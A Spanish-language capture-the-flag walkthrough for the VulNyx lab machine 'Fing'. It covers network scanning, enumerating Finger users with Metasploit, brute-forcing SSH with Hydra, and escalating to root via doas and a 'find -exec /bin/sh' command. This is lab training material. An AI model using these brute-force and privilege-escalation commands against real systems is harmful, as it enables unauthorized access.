---
Nombre de la máquina: Fing
Sistema Operativo: Linux
Enlace de descarga: https://vulnyx.com/
---

## Escaneo de equipos de la red.

Una vez que hemos descargado la máquina y la hemos levantado en nuestro virtualizador, procedemos a buscarla utilizando la herramienta ARP-SCAN.
```
sudo arp-scan -I (NUESTRA INTERFAZ) --localnet
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/cc792507-e35e-4d23-a315-86612237ff7e)

Nos percatamos de que después de la dirección MAC, el escaneo con ARP-SCAN identifica el dispositivo como 'VMware'. Para confirmarlo, podríamos realizar un ping para verificar la conexión y su TTL.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/eb6f7ab9-0473-4fb1-9018-bec0e316b4b3)


## Nmap.

Una vez que hemos identificado claramente la IP objetivo, es el momento de realizar el escaneo con Nmap.
```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.1.105
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/01ebda0f-42f4-4834-b556-48c121ee84bf)

Como podemos observar, el escaneo de puertos revela que hay 3 puertos abiertos: 22/SSH, 79/Finger y 80/HTTP. Siguiendo el procedimiento habitual, lo primero que haremos es revisar la aplicación web que se está ejecutando en el puerto 80.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/821b6b76-6410-484a-8bf4-d7f39b1440db)

Dado que se trata de un servidor Apache por defecto, procederemos a buscar directorios, en caso de que los haya.

## Fuzzing.

```
gobuster dir -u http://192.168.1.105 -w (DICCIONARIO)
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/790ff582-ba3a-441d-aec7-5b2f88f3c782)

Como vemos, la herramienta Gobuster no nos encuentra nada interesante, por lo que podríamos ponernos en la búsqueda de subdirectorios. Aunque primero vamos a revisar el servicio del puerto 79 que nos encontró el escaneo con Nmap: Finger.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/fccd9f50-b88e-4b60-a05f-2258fad848ce)
![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/0fd5efe5-b008-4e25-92f8-e0793d775a87)

Encontramos que existen módulos en Metasploit disponibles para ese servicio.

## Metasploit.

Ejecutamos Metasploit y buscamos un módulo con la palabra 'finger'.

```
msfconsole
```
```
search finger
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/9e9f5a1f-fb23-4c1d-9343-f23d5f2c4ccd)

Como observamos, con el módulo número 1 podemos listar usuarios, por lo que procedemos a configurarlo y ejecutarlo.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f5cc909a-89c7-4939-8899-debd586ac97f)

Después de configurar el exploit, estableciendo la IP objetivo y el diccionario que utilizamos para el ataque con nombres de usuarios, nos indica que hay un usuario llamado 'adam'. Rápidamente, probamos sin éxito el módulo de ataques de fuerza bruta al protocolo SSH, por lo que continuamos con la herramienta Hydra.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/60bebce6-9903-4aaa-b9e2-0f8c40f9f670)

## Hydra.

Atacamos con Hydra indicando el usuario, el diccionario que utilizaremos y el protocolo que vamos a atacar.
```
sudo hydra -l adam -P DICCIONARIO ssh://192.168.1.105
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/f26d8fd3-dd24-4a9a-89d0-1f6884443d26)

Hydra descubre la contraseña "passion", permitiéndonos así conectar por SSH.

## Escalada de privilegios.

Una vez conectados por SSH con el usuario adam, lo primero que probamos son los comandos habituales o estándar:
```
sudo -l
```
```
find / -perm -4000 2</dev/null
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/7c596878-a73b-4511-af43-0c1473cb4b64)

Dentro de los binarios no encontramos nada destacable, excepto el binario DOAS. Por lo tanto, procedemos a descargar y utilizar la herramienta "linpeas.sh" para mayor seguridad.

```
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/0e16e493-2b1c-4da1-afdc-f02e4f300f31)

Como observamos en el resultado del escaneo con linpeas, nuevamente resalta el binario DOAS y el chequeo del archivo doas.conf. Básicamente, nos indica que podemos ejecutar el binario FIND como root. Por lo tanto, procedemos a buscar más información sobre DOAS.

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/bcb0c51a-2be9-4aa6-894b-b2d00ceac5dc)

Finalmente, sabiendo que podemos ejecutar FIND como root, vamos a https://gtfobins.github.io/#find para explorar las opciones que tenemos para escalar privilegios con dicho binario.

```
find . -exec /bin/sh \; -quit
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/6f16b0dd-cd6c-42ca-8299-3076417ea9db)

Colocamos el comando encontrado en GTFObins, especificando que lo ejecutaremos con el comando DOAS y utilizando el usuario ROOT, tambien colocando la ruta absoluta del binario.

```
doas -u root /usr/bin/find . -exec /bin/sh \; -quit
```

![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/bde0fc3d-b6b8-4e4f-a3cd-3505afd80fef)

Y como podemos observar, ahora somos el usuario root.

## Flags. 
![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/640e0005-326b-46a8-b44b-3875fe2b22e0)
